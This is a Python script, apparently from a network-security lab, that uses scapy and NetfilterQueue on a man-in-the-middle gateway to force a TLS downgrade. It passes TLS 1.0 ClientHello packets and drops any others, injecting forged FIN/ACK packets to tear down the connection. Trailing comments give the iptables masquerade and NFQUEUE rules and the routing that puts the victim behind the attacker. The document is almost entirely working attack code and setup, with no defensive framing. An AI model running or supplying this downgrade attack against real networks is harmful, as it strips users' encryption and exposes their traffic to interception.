from scapy.all import *
from netfilterqueue import NetfilterQueue
import re


attacker_ip = "172.16.0.3"

def intercept(pkt):
	ip = IP(pkt.get_payload())
	client_hello_regex = re.compile(b"\x16\x03\x01.{2}\x01")
	
	if not ip.haslayer("Raw"):
		print("Accepted: No Raw field")
		pkt.accept()

	if ip.haslayer("Raw"):
		http = ip["Raw"].load

		if client_hello_regex.search(http):
			if http[10] == 0x01:
				print("This packet was Accepted: TLSv1.0")
				pkt.accept()
			else:
				print("This packet was Droped")
				# Drop the packet. Use it to terminate the connection to the server

				new_pkt = IP(dst=ip[IP].dst, src=attacker_ip)/TCP()
				new_pkt[TCP].sport = ip[TCP].sport
				new_pkt[TCP].dport = ip[TCP].dport
				new_pkt[TCP].seq = ip[TCP].seq
				new_pkt[TCP].ack = ip[TCP].ack
				new_pkt[TCP].flags = 'FA'

				print("Self created packet")
				new_pkt.show()
				send(new_pkt)
				pkt.drop()
		else:
			print("Accepted: Not a Client-Hello")
			pkt.accept()
		

nfqueue = NetfilterQueue()
nfqueue.bind(0, intercept, 100)
try:
	nfqueue.run()
except KeyboardInterrupt:
	print('KeyboardInterrupt')

nfqueue.unbind()

"""
iptables -t nat -A POSTROUTING -j MASQUERADE
The rule uses the NAT packet matching table (-t nat) and specifies the built-in POSTROUTING 
chain for NAT (-A POSTROUTING) on the firewall's external networking device. 
POSTROUTING allows packets to be altered as they are leaving the firewall's external device. 
The -j MASQUERADE target is specified to mask the private IP address of a node with the 
external IP address of the firewall/gateway. 


iptables -A FORWARD -s 172.16.0.2 -p tcp --dport 80 -j NFQUEUE --queue-num 0
The FORWARD policy allows an administrator to control where packets can be routed within a LAN.
-s: Source specification
-p: The protocol of the rule or of the packet to check
--dport (--destionation-port): destionation port, needs to be changed to 443!
-j (--jump): This specifies the target of the rule; i.e., what to do if the packet matches it.
NFQUEUE: This target is an extension of the QUEUE target. As opposed to QUEUE, it allows you 
to put a packet into any specific queue, identified by its 16-bit queue number. 
--queue-num: This specifies the QUEUE number to use. Valud queue numbers are 0 to 65535. 
The default value is 0. 

Use: route add default gateway 172.16.0.3?????

(ip.dst == 172.16.0.3) || (ip.dst == 172.16.0.2) || (ip.dst == 128.179.33.29)
"""